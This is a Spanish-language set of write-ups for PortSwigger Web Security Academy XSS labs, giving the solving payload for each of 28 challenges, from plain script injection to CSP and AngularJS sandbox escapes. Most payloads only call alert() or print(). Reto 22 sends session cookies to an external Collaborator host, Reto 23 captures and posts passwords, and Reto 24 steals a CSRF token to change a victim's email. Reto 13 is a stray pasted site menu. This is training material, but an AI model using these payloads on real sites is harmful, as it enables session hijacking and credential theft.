# XSS

## Reto 1: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una simple vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de búsqueda.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función.

La solución en este ejemplo es simple:

En la barra de búsqueda tenemos que poner lo siguiente :

```javascript
<script>alert(0)</script> 
```

De esta manera aparecera un comentario emergente con el número 0.

## Reto 2: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios.

Para resolver este laboratorio, envíe un comentario que llame al alertFunción cuando se visualiza la publicación del blog.

De la misma forma usamos la función anterior para comprobar si es vulnerable en alguno de los campos para comentar

```javascript
<script>alert(0)</script> 
```

comprobamos que en el apartado de comentarios salta la alerta

## Reto 3: XSS DOM con ‘document.write’ y ‘location.search’

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad de seguimiento de consultas de búsqueda. Utiliza JavaScript. document.writefunción, que escribe datos en la página. La document.writeLa función se llama con datos de location.search, que puedes controlar mediante la URL del sitio web.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función.

Al igual que los ejemplos anteriores ahora hay  otro panel de busqueda donde podemos intentar insertar una alerta

```javascript
<script>alert(0)</script> 
```

sin embargo vemos que no funciona por lo tanto vamos a probar otro tipo de inyección y es que la vulnerabilidad no reside en el servidor, sino en cómo el código JavaScript del navegador procesa los datos de la URL.

Inicialmente observamos que al hacer una búsqueda cualquiera, el valor se refleja dentro de un atributo de imagen. A partir de ahí, construimos un vector de ataque que rompe el atributo e introduce código que se ejecuta en el navegador de la víctima.

XSS es especialmente común en aplicaciones ricas en JavaScript y demuestra cómo la lógica del lado cliente puede ser tan peligrosa como una mala validación en el backend.

```javascript
"><script>alert(0)</script> 
```

## Reto 4: DOM XSS en innerHTML usando fuente location.search

```javascript
 function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
    var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
             doSearchQuery(query);
        }
```

La aplicación vulnerable toma el valor introducido en la búsqueda (extraído directamente desde la URL) y lo inserta dentro del contenido de una etiqueta mediante una asignación directa sin aplicar ninguna medida de sanitización. Esto permite introducir fragmentos de código que se interpretan como HTML y que pueden incluir eventos maliciosos.

Teniendo en cuenta que esta ocurriendo podemos saber como podemos introducir la query:

```javascript
<img src="test.png" oneerror=alert(0)>
```

En este caso, se utiliza una imagen con una ruta inválida que provoca un error al cargar. Ese error activa un manejador de eventos que ejecuta el código malicioso, confirmando que la vulnerabilidad es explotable.

## Reto 5: XSS DOM en ‘href’ con jQuery y ‘location.search’

Este laboratorio contiene una vulnerabilidad de scripts entre sitios basada en DOM en la página de envío de comentarios. Utiliza la biblioteca jQuery. $ Función selectora para encontrar un elemento de anclaje y cambia su href atributo utilizando datos de location.search.

La aplicación vulnera al utilizar jQuery para localizar un enlace de navegación y modificar su destino utilizando directamente el valor de un parámetro en la URL. Al no realizarse ningún tipo de validación ni restricción sobre ese valor, es posible reemplazar el destino original con un esquema especial que ejecute código malicioso.

En este caso, sustituimos el valor del parámetro con una instrucción que, al hacer clic en el enlace, ejecuta una función para mostrar las cookies del navegador, demostrando así la explotación exitosa de la vulnerabilidad.

```
https://0a1b00b10484e04b806180af00a40014.web-security-academy.net/feedback?returnPath=javascript:alert(0)
```

## Reto 6: XSS DOM con jQuery y evento ‘hashchange’
Este laboratorio contiene una vulnerabilidad de scripts entre sitios basada en DOM en la página de inicio. Utiliza jQuery. $ Función de selección para desplazarse automáticamente a una publicación determinada, cuyo título se pasa a través de la location.hash .

Para resolver el laboratorio, entregue un exploit a la víctima que llame al print() en su navegador. 

Este script permite que, al cambiar el hash en la URL (ej. #MiTitulo), la página busque un encabezado <h2> con ese texto dentro de la lista del blog y haga scroll hacia él automáticamente.

El problema es que se emplea directamente como selector, sin validación alguna, permitiendo al atacante manipularlo para inyectar y ejecutar código en el navegador de la víctima.

```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
            if (post) post.get(0).scrollIntoView();
            });
</script>
```

Montamos un ataque usando un servidor de explotación que carga la página vulnerable dentro de un contenedor invisible. Al modificarse dinámicamente la URL interna, se inyecta una instrucción que se ejecuta automáticamente mediante un evento de error, invocando una función del navegador como demostración.

En la URL ponemos la siguiente sentencia, esta como no existe una imagen que sea 0 da el error y se va a la funcion print(), sin embargo esto si lo pasamos no funcionará:

```
/#<img src=0 onerror=print()>
```

Podemos usar `<iframe>` para meter una página web dentro de otra y concatenar la funcion print()
```
<iframe src="https://url.burp/#" onload="this.src +='<img src=0 onerror=print()>'"><iframe>
```
## Reto 7: XSS reflejado en atributo con corchetes angulares codificado en HTML

Este laboratorio contiene una vulnerabilidad reflejada de secuencias de comandos entre sitios en la función de búsqueda de blogs, donde los corchetes angulares están codificados en HTML. 

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un atributo y llame a alert(). 


Este XSS reflejado que no ocurre dentro del cuerpo de una etiqueta HTML, sino dentro de un atributo. La aplicación codifica los signos angulares para evitar que se abran etiquetas directamente, pero permite inyectar contenido dentro de valores entre comillas.

La funcionalidad vulnerable es el buscador del blog. Al introducir un valor en el cuadro de búsqueda, este se refleja dentro de un atributo HTML en la respuesta. Usando herramientas como Burp Suite, interceptamos la petición y comprobamos que nuestro valor aparece entre comillas dentro de ese atributo.

``` html
<input type="text" placeholder="Search the blog..." name="search" value="<h1>HOLA</h1>">
```

Vemos que si usamos el típico del script lo encodea y hace que no se pueda disparar la alerta 
```html
<input type="text" placeholder="Search the blog..." name="search" value="" &gt;&lt;script&gt;alert(0)&lt;="" script&gt;"="">
```

La estrategia consiste en cerrar el valor actual del atributo e introducir uno nuevo que contenga un manejador de eventos (por ejemplo, uno que se active al pasar el ratón). Al acceder a la URL modificada y mover el cursor sobre el área afectada, se ejecuta el código inyectado, demostrando que la inyección fue exitosa.

si hacemos las siguiente inyección:

```
'" onmouseover="alert(0)'
```

```html
<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(0)">
```

## Reto 8: XSS almacenado en el enlace href como atributo con comillas dobles codificado en HTML

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la función de comentarios. Para resolver este laboratorio, envíe un comentario que invoque la función alertFunción cuando se hace clic en el nombre del autor del comentario. 

El XSS almacenado que se produce dentro de un atributo de tipo enlace (href). La funcionalidad vulnerable es el sistema de comentarios del blog, que permite introducir un nombre, correo y un sitio web. El valor del sitio web se utiliza como destino en un enlace generado automáticamente alrededor del nombre del autor del comentario.

El sistema codifica las comillas dobles, pero no valida ni restringe el contenido del enlace. Esto permite introducir un esquema especial como dirección, el cual no apunta a una página web sino que ejecuta directamente código cuando el usuario hace clic.

Aprovechamos este comportamiento para insertar un valor que desencadena una acción maliciosa cuando alguien interactúa con el nombre del autor. Al tratarse de un XSS almacenado, el código queda persistente en la aplicación y se ejecutará para cualquier visitante que visualice ese comentario.


<a id="author" href="javascript:alert(0)">test</a>

## Reto 9: XSS reflejado en una cadena de JavaScript con corchetes angulares codificados en HTML 
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de seguimiento de consultas de búsqueda, donde se codifican los corchetes angulares. La reflexión ocurre dentro de una cadena de JavaScript. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que interrumpa la cadena de JavaScript e invoque la función alert. 

La funcionalidad afectada es el sistema de seguimiento de búsquedas. Al introducir una consulta, el valor se refleja en una variable JavaScript como parte de una cadena. Esto permite al atacante cerrar esa cadena con comillas o caracteres especiales, insertar código adicional, y continuar la ejecución sin generar errores de sintaxis.

para nuestro ejemplo tendriamos que modificar el script y poner el en buscador lo siguiente:

```
'testing'; alert(0); var testing='probando
```

Utilizamos este enfoque para romper la cadena original y ejecutar una función maliciosa teniendo en cuneta si se cierra con las comillas la sentencia y modificandola, demostrando así que la inyección es posible a pesar del filtrado parcial.

## Reto 10:Laboratorio: DOM XSS en document.writesumidero usando fuente location.searchdentro de un elemento seleccionado

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad de verificación de acciones. Utiliza JavaScript. document.writefunción, que escribe datos en la página. La document.write La función se llama con datos de location.search Que se puede controlar mediante la URL del sitio web. Los datos se incluyen en un elemento de selección.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que salga del elemento de selección y llame al alert función. 

```js
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
        document.write('</select>');
```
En la Url tenemos que intentar agregar nuestra seleccion y forzar la alerta escapando de la funcion select

productId=1&storeId=</option></select><script>alert(0)</script>

## Reto 11: XSS de DOM reflejado

Este laboratorio demuestra una vulnerabilidad de DOM reflejado. Las vulnerabilidades de DOM reflejado ocurren cuando la aplicación del servidor procesa datos de una solicitud y los reproduce en la respuesta. Un script en la página procesa los datos reflejados de forma insegura, escribiéndolos finalmente en un receptor peligroso.

Para resolver este laboratorio, cree una inyección que llame a la alert() función.


La funcionalidad vulnerable está en el buscador del sitio. Al realizar una búsqueda, el término ingresado se refleja en un archivo JSON de resultados que podemos verlo usando la aplicación de burpsuite. Este contenido es posteriormente procesado por un script que usa una función (eval()) que interpreta dinámicamente texto como si fuera código, abriendo la puerta a una inyección si no se escapan correctamente ciertos caracteres.

Aunque el sistema escapa comillas, no hace lo mismo con otros símbolos clave, como la barra invertida. Esto nos permite construir un valor malicioso que rompe la estructura del objeto y añade una instrucción personalizada, haciendo que se ejecute directamente en el navegador.

la sentencia seria la siguiente:

- Cerramos la sentencia con la \
- Usamos una operacion aritmetica esto lo podemos hacer porque se emplea la funcion eval()
- Realizamos nuestra funcion maliciosa para que se ejecute

```bash
testing\"*alert(0)}// 
```

## Reto 12: Xss de DOM almacenado

Este laboratorio demuestra una vulnerabilidad de DOM almacenado en la funcionalidad de comentarios del blog. Para resolver este laboratorio, explote esta vulnerabilidad para llamar a alert() función.

La funcionalidad vulnerable se encuentra en el sistema de comentarios del blog. Para prevenir ataques, el sitio aplica una función de reemplazo que intenta codificar los signos angulares, pero lo hace incorrectamente: solo reemplaza la primera aparición en lugar de todas porque usa la funcion replace y no replaceAll.

```javascript
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

Aprovechamos este fallo insertando un par adicional de signos al principio del comentario. Estos primeros caracteres serán codificados y neutralizados, pero los siguientes no serán tocados, permitiendo que el navegador interprete y ejecute el contenido malicioso cuando se carga la página.

La solucion sería la siguiente:

```html
<><script>alert(0)</script>
```
Se puede apreciar que no funciona pero tenemos otras alternativas pudiendo usar la siguiente:

```html
<><img src=0 onerror=alert(0)>
```

## Reto 13: 
My account
Products
Solutions
Research
Academy
Support
Customers
About
Blog
Careers
Legal
Contact
Resellers
Customers
About
Blog
Careers
Legal
Contact
Resellers
Burp Suite DAST Burp Suite DAST The enterprise-enabled dynamic web vulnerability scanner.
Suite Burp Professional Burp Suite Professional El kit de herramientas de pruebas de penetración web número uno del mundo.
Edición comunitaria de Burp Suite Burp Suite Community Edition: Las mejores herramientas manuales para empezar a realizar pruebas de seguridad web.
Ver todas las ediciones del producto.

Burp Scanner

Escáner de vulnerabilidades web de Burp Suite
El escáner de vulnerabilidades web de Burp Suite
Attack surface visibility Improve security posture, prioritize manual testing, free up time.
CI-driven scanning More proactive security - find and fix vulnerabilities earlier.
Application security testing See how our software enables the world to secure the web.
DevSecOps Catch critical bugs; ship more secure software, more quickly.
Penetration testing Accelerate penetration testing - find more bugs, more quickly.
Automated scanning Scale dynamic scanning. Reduce risk. Save time/money.
Bug bounty hunting Level up your hacking and earn more bug bounties.
Compliance Enhance security monitoring to comply with confidence.
Ver todas las soluciones

Product comparison

¿Cuál es la diferencia entre Pro y Enterprise Edition?
Burp Suite Professional vs. Burp Suite Enterprise Edition
Support Center Get help and advice from our experts on all things Burp.
Documentation Tutorials and guides for Burp Suite.
Get Started - Professional Get started with Burp Suite Professional.
Get Started - Enterprise Get started with Burp Suite Enterprise Edition.
User Forum Get your questions answered in the User Forum.
Downloads Download the latest version of Burp Suite.
Visita el Centro de soporte

Downloads

Descargue la última versión de Burp Suite.
La última versión del software Burp Suite para descargar

    Dashboard
    Learning paths
    Latest topics
    All content
    Hall of Fame
    Get started
    Get certified

Volver a todos los temas

    ¿Qué es XSS?
    ¿Cómo funciona XSS?
    Impacto de un ataque
    Prueba de concepto
    Pruebas
    XSS reflejado
    XSS almacenado
    XSS basado en DOM
    Contextos XSS
    Explotación de vulnerabilidades XSS
    Inyección de marcado colgante
    Política de seguridad de contenido (CSP)
    Prevención de ataques XSS
    Hoja de trucos
    Ver todos los laboratorios XSS

    Academia de Seguridad Web
    Scripting entre sitios
    Contextos
    Laboratorio 

## Reto 14: XSS reflejado en contexto HTML con la mayoría de las etiquetas y atributos bloqueados


Este laboratorio contiene una vulnerabilidad XSS reflejada en la funcionalidad de búsqueda, pero utiliza un firewall de aplicaciones web (WAF) para protegerse contra vectores XSS comunes.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite el WAF y llame al print() función.

Nota
Su solución no debe requerir ninguna interacción del usuario. Causar manualmente print()Llamarlo en su propio navegador no resolverá el laboratorio.

La funcionalidad vulnerable es un buscador, donde el valor introducido se refleja directamente en el contenido HTML. Intentos clásicos de inyección son rechazados, por lo que utilizamos una estrategia sistemática con ayuda de Burp Suite.

Con Burp Intruder, realizamos una prueba automatizada enviando distintas etiquetas HTML y atributos, observando cuáles generan respuestas válidas. Detectamos que la etiqueta ```<body>``` y el atributo ```onresize``` no son filtrados. A partir de ahí, construimos un vector usando un contenedor invisible que al cargarse activa un evento de cambio de tamaño, el cual ejecuta directamente una función del navegador.

la url quedaria de la siguiente manera:

```
https://url/?search=<body onresize=print()>
```

La prueba se completa al entregar el vector a una víctima a través de un servidor de explotación, validando así que la ejecución ocurre sin necesidad de clics o interacción adicional.

Para mandarlo a la víctima podemos utilizar el tag ```<iframe>``` y ademas de forzar a que cuando se cargue la pantalla haga el resize 
de la siguiente forma:

```
<iframe src="https://url/?search=<body onresize=print()>" onload=this.style.with='100px'></iframe>
```

## Reto 15: XSS reflejado en contexto HTML con todas las etiquetas bloqueadas excepto las personalizadas

Este laboratorio bloquea todas las etiquetas HTML excepto las personalizadas.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte una etiqueta personalizada y alerte automáticamente document.cookie. 

La aplicación ha bloqueado por completo todas las etiquetas HTML estándar, permitiendo únicamente etiquetas personalizadas. Este tipo de configuración busca prevenir inyecciones, pero aún puede ser burlada si no se filtran los atributos o eventos correctamente.

Utilizamos un servidor de explotación para construir un vector que incluye una etiqueta inventada, con un identificador específico y un evento que se activa al enfocar ese elemento. Al añadir un fragmento al final de la URL que apunta a esa etiqueta personalizada, el navegador intenta enfocarla automáticamente al cargar la página, lo que desencadena la ejecución del código malicioso sin necesidad de interacción del usuario.

Este laboratorio demuestra cómo incluso etiquetas no estándar pueden ser vehículos válidos para ataques XSS si los atributos y eventos no son controlados adecuadamente, reforzando la importancia de validar todo el contenido, no solo el nombre de la etiqueta.

En nuestro caso he empleado 
```html
<script>
location='https://0a2d009f034a933080bc03fe00d40072.web-security-academy.net/?search=<etiqueta id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

La explicación por partes:

```<etiqueta ...>```: Aquí se usa una etiqueta falsa (no estándar). Algunos navegadores la interpretan igual que una etiqueta HTML personalizada.

```id=x```: Se le da un ID para que pueda ser referenciada por el hash al final de la URL.

```onfocus=alert(document.cookie)```: Este es el evento malicioso. Cuando el elemento recibe foco (focus), se ejecuta alert(document.cookie) mostrando las cookies del sitio.

```tabindex=1```: Esto hace que el elemento pueda recibir foco al navegar con el teclado (tabulación).

```#x```: El fragmento de anclaje de la URL hace que el navegador intente hacer foco en el elemento con id="x".


## Reto 16: Laboratorio: XSS reflejado con algún marcado SVG permitido

Este laboratorio presenta una vulnerabilidad XSS reflejada simple. El sitio bloquea etiquetas comunes, pero omite algunas etiquetas y eventos SVG.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert() función.  

La vulnerabilidad está en el buscador, que refleja la entrada del usuario directamente en la respuesta. Aunque intentos típicos de inyección son bloqueados, realizamos un análisis sistemático usando Burp Intruder para descubrir qué etiquetas y atributos aún son aceptados por el sistema.

Tras probar múltiples combinaciones, identificamos que algunas etiquetas del entorno SVG, como svg y animatetransform, junto con eventos como onbegin, no son filtradas y permiten la ejecución de código al momento de cargarse la página.

Para resolver el laboratorio seria algo asi:

```
/?search=<svg><animateTransform%20onbegin=alert(0)>
```


Aprovechamos esto para construir un vector que, sin intervención del usuario, desencadena una función en el navegador al iniciarse la animación SVG, completando con éxito el laboratorio.

## Reto 17: XSS reflejado en la etiqueta de enlace canónico


Este laboratorio refleja la entrada del usuario en una etiqueta de enlace canónica y escapa de los corchetes angulares.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios en la página de inicio que inyecte un atributo que llame al alert función.

Para facilitar su explotación, puede asumir que el usuario simulado presionará las siguientes combinaciones de teclas:

```txt
    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X
```

Tenga en cuenta que la solución prevista para este laboratorio solo es posible en Chrome. 

Aprovechamos este comportamiento para insertar atributos como accesskey y onclick, que nos permiten asociar una acción concreta en este caso, la ejecución de código a una combinación específica de teclas.

El exploit se construye de forma que, al presionar una combinación como Alt+Shift+X, el navegador dispare un evento que ejecuta la función deseada. Aunque no ocurre de forma automática al cargar la página, se considera válida ya que no requiere interacción directa con el contenido visible ni clics por parte del usuario.
```html
<link rel="canonical" href='https://0ac3004004ca247180541c3a00d10055.web-security-academy.net/?'accesskey='x'onclick='alert(0)'/>
```

## Reto 18: XSS reflejado en una cadena de JavaScript con comillas simples y barra invertida como caracteres de escape

Este laboratorio contiene una vulnerabilidad reflejada de secuencias de comandos entre sitios en la función de seguimiento de consultas de búsqueda. La reflexión se produce dentro de una cadena de JavaScript con comillas simples y barras invertidas de escape.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que rompa la cadena de JavaScript y llame al alert función

Al intentar romper la cadena directamente, observamos que los caracteres clave quedan neutralizados, impidiendo ejecutar código dentro del mismo contexto. La estrategia, entonces, consiste en cerrar la etiqueta de script actual e insertar una nueva, completamente separada, que contenga la instrucción maliciosa.

```html
'</script><script>alert(0)</script>'
```

De este modo, el contenido inyectado no depende de romper la cadena desde dentro, sino de interrumpir el bloque de código y generar uno nuevo fuera del contexto protegido. El navegador interpreta esta estructura como válida, permitiendo la ejecución de la función deseada.

## Reto 19: XSS reflejado en una cadena de JavaScript con corchetes angulares y comillas dobles codificadas en HTML y comillas simples escapadas

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de seguimiento de consultas de búsqueda, donde los corchetes angulares y los dobles están codificados en HTML y las comillas simples se escapan.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que rompa la cadena de JavaScript y llame al alert función. 

El valor reflejado del buscador se inserta en una variable delimitada por comillas simples. En este caso, las comillas simples están escapadas correctamente, y tanto los signos angulares como las comillas dobles están codificados como entidades HTML.

Sin embargo, la clave está en que las barras invertidas no se escapan, lo que nos permite introducir una de forma manual y romper el contexto de la cadena desde fuera.

```bash
test\'+alert(0);//
```

Aprovechamos esta debilidad insertando una barra invertida seguida de una comilla escapada que finaliza la cadena, y después inyectamos una instrucción directa, separándola del código original con un operador y comentarios para evitar errores de sintaxis.

## Reto 20: XSS almacenado en onclickevento con corchetes angulares y comillas dobles codificadas en HTML y comillas simples y barra invertida escapadas

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios.

Para resolver este laboratorio, envíe un comentario que llame al alertFunción cuando se hace clic en el nombre del autor del comentario. 

El sistema aplica múltiples medidas de protección: codifica los signos angulares y las comillas dobles como entidades HTML, y además escapa tanto las comillas simples como las barras invertidas. Sin embargo, al observar cuidadosamente cómo se construye el atributo, descubrimos que aún podemos romper la estructura si inyectamos un valor cuidadosamente diseñado.

Utilizamos un valor de URL que contiene una secuencia manipulada para cerrar el contexto del atributo y ejecutar una función directamente. El carácter de escape que normalmente neutralizaría la comilla es absorbido por la estructura de la URL, permitiendo que el código se ejecute al hacer clic sobre el nombre del autor.

```html
https://probando.com&apos;+alert(0)+&apos;
```

## Reto 21: XSS reflejado en un literal de plantilla con corchetes angulares, comillas simples y dobles, barras invertidas y comillas invertidas con escape Unicode

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la función de búsqueda del blog. La reflexión se produce dentro de una cadena de plantilla con corchetes angulares, comillas simples y dobles codificadas en HTML, y comillas invertidas de escape. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que invoque alertfunción dentro de la cadena de plantilla. 

El sistema aplica un filtrado agresivo que codifica signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas, bloqueando así inyecciones clásicas. Sin embargo, no restringe las expresiones contenidas entre el símbolo de dólar y llaves, que son interpretadas como código ejecutable dentro de la plantilla.

Aprovechamos esta brecha introduciendo una expresión que se evalúa directamente al cargar la página, sin necesidad de romper el delimitador original. Al estar el contenido ya dentro de una cadena ejecutable, el navegador interpreta la expresión de inmediato y ejecuta la función deseada.

```java
${alert(0)}
```

## Reto 22: Explotación de secuencias de comandos entre sitios para robar cookies

Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Un usuario víctima simulado ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para extraer la cookie de sesión de la víctima y, a continuación, utilice esta cookie para suplantar su identidad.

Aprovechamos la vulnerabilidad para insertar un fragmento de código que, al ejecutarse en el navegador de la víctima, recopila su cookie de sesión y la envía en segundo plano a un servidor externo controlado a través de Burp Collaborator, una herramienta diseñada para capturar interacciones fuera de banda.

Una vez interceptada la cookie, la utilizamos para suplantar la identidad del usuario afectado, inyectándola en nuestras propias peticiones mediante un proxy o el módulo Repeater de Burp Suite. Esto nos da acceso a áreas privadas como si fuéramos la víctima.

<script>
fetch("https://356v5ezsjg48pm1q7drtw4iax13srjf8.oastify.com/?cookie=" +btoa(document.cookie));
</script>

## Reto 23 : Explotación de secuencias de comandos entre sitios para capturar contraseñas


Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Una víctima simulada ve todos los comentarios después de su publicación. Para resolver el laboratorio, explote la vulnerabilidad para extraer el nombre de usuario y la contraseña de la víctima y, a continuación, utilice estas credenciales para iniciar sesión en su cuenta.  

Aprovechamos esta oportunidad para insertar campos de entrada personalizados en el comentario, imitando elementos ya existentes en la página. Añadimos un evento que, cuando el usuario introduce su contraseña, intercepta el valor junto con su nombre de usuario y los envía automáticamente al servidor público de Burp Collaborator.

Una vez que recibimos esta información en el panel de Collaborator, podemos utilizar las credenciales capturadas para iniciar sesión como la víctima, accediendo así directamente a su cuenta.


```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## Reto24: Explotación de XSS para eludir las defensas CSRF

Este laboratorio contiene una vulnerabilidad XSS almacenada en la función de comentarios del blog. Para solucionarlo, explote la vulnerabilidad para robar un token CSRF, que luego podrá usar para cambiar la dirección de correo electrónico de quien vea los comentarios de las entradas del blog.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

En este caso, consolidamos la explotación automatizando todo el flujo: cuando una víctima visualiza el comentario malicioso, su navegador realiza una petición a su propia página de perfil, extrae el token CSRF del formulario oculto, y lo reutiliza inmediatamente para enviar una petición de cambio de correo electrónico sin que el usuario lo sepa.

Este enfoque permite realizar una acción sensible como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.


```html
<script>
var req = new XMLHttpRequest();
req.open("GET", "/my-account", false);
req.send();
var response = req.responseText;
var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
var req2 = new XMLHttpRequest();
req2.open('POST','/my-account/change-email',true);
req2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var data = "email="+ encodeURIComponent("test2@test.com")+ "&csrf="+ encodeURIComponent(csrf_token);
req2.send(data)
</script>
```

## Reto 25: XSS reflejado con escape sandbox de AngularJS sin cadenas

Este laboratorio utiliza AngularJS de una manera inusual donde el $eval La función no está disponible y no podrá utilizar ninguna cadena en AngularJS.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que escape del entorno limitado y ejecute el siguiente comando: alertfunción sin utilizar la $eval función. 

La inyección ocurre dentro de una expresión Angular, pero el entorno está configurado para evitar el uso de ‘eval’ y bloquear por completo cualquier intento de utilizar cadenas de texto.

El enfoque consiste en usar funciones nativas de JavaScript para construir cadenas de forma indirecta. Aprovechamos el método ‘toString()‘ y la propiedad ‘constructor‘ para acceder al prototipo de los objetos y redefinir cómo se comportan. En concreto, se sobrescribe el método ‘charAt‘ del prototipo de las cadenas, lo que permite eludir el sistema de seguridad interno de AngularJS.

Luego pasamos una expresión al filtro ‘orderBy‘, y generamos el código deseado utilizando ‘fromCharCode‘ con los valores numéricos correspondientes a los caracteres de la cadena ‘x=alert(1)‘. Como hemos alterado el comportamiento interno de las cadenas, AngularJS permite que esta expresión se ejecute donde normalmente estaría bloqueada.

```Angular
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'testing';
                            $scope.value = $parse(key)($scope.query);
                        });
```

Para resolver el laboratorio tenemos que emplear el código en AngularJS para salir de la sandbox 

```AngularJS
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)

//los numeros son la expresion [x=alert(1)] codificada

```

## Reto 26 : XSS reflejado con escape de sandbox de AngularJS y CSP

Este laboratorio utiliza CSP y AngularJS.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite CSP, escape del entorno limitado de AngularJS y alerte document.cookie. 

Una política CSP que impide la ejecución directa de scripts no autorizados, y el sandbox de AngularJS, que filtra el acceso a objetos críticos como el contexto global del navegador.

Para evadir ambas restricciones, construimos un vector que utiliza una expresión Angular inyectada dentro de un evento enfocado. Aprovechamos el evento ng-focus para ejecutar código al activarse el elemento y accedemos al objeto del evento a través de una variable predefinida por Angular. Esta variable contiene una ruta hacia el objeto window, sin necesidad de referenciarlo directamente, lo que nos permite eludir la validación del sandbox.

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```

La inyección se construye utilizando el filtro orderBy con un argumento malicioso. En lugar de invocar directamente la función de alerta, se asigna a una variable dentro del filtro, y esta se ejecuta cuando se alcanza el contexto de ejecución adecuado.

```html
<script>
location = 'https://0a35007903b0071480db0372008300e9.web-security-academy.net/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
</script>
```

## Reto 27: XSS reflejado con controladores de eventos y hrefatributos bloqueados

Este laboratorio contiene una vulnerabilidad XSS reflejada con algunas etiquetas incluidas en la lista blanca, pero todos los eventos y anclajes hrefLos atributos están bloqueados.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un vector que, al hacer clic, llame al alert función.

Tenga en cuenta que debe etiquetar su vector con la palabra "Clic" para inducir al usuario del laboratorio simulado a hacer clic en él. Por ejemplo:
<a href="">Click me</a>

Todos los eventos JavaScript y los atributos href están bloqueados, lo que impide usar vectores clásicos como enlaces con scripts o atributos on-click.

Para evadir estas restricciones, utilizamos una estructura SVG compuesta que simula un enlace visual. Insertamos una etiqueta de animación dentro de un elemento interactivo y manipulamos un atributo gráfico permitido para que, al ser activado, modifique el valor del enlace con un esquema que ejecuta código.

La animación se activa de forma implícita al interactuar con el contenido, y dado que se encuentra dentro de un SVG, el navegador interpreta la secuencia de forma válida aunque los filtros bloqueen atributos estándar. Además, se incluye la palabra Click como anzuelo visual para atraer al usuario simulado del laboratorio a realizar la acción.

```html
<svg><a><animate attributeName=href values=javascript:alert(0) /><text>Click me!</text></a>
```

## Reto 28:XSS reflejado en una URL de JavaScript con algunos caracteres bloqueados

Este laboratorio refleja tu entrada en una URL de JavaScript, pero no todo es lo que parece. Inicialmente, parece un desafío trivial; sin embargo, la aplicación bloquea algunos caracteres para evitar ataques XSS.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alertfunción con la cadena 1337contenido en algún lugar de la alert mensaje. 

El objetivo es perfeccionar el uso de estructuras complejas del lenguaje para forzar la ejecución del código. Mantenemos el enfoque en el uso de funciones flecha que permiten utilizar sentencias como throw, normalmente no válidas en expresiones, y combinamos esta técnica con la redefinición de propiedades internas como toString.

Al forzar la conversión del objeto window a cadena, conseguimos activar la ejecución sin llamar a la función explícitamente. Esta variante demuestra cómo JavaScript puede ser manipulado para lograr ejecución de código incluso en contextos altamente filtrados, sin necesidad de paréntesis, comillas ni llamadas directas.

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
```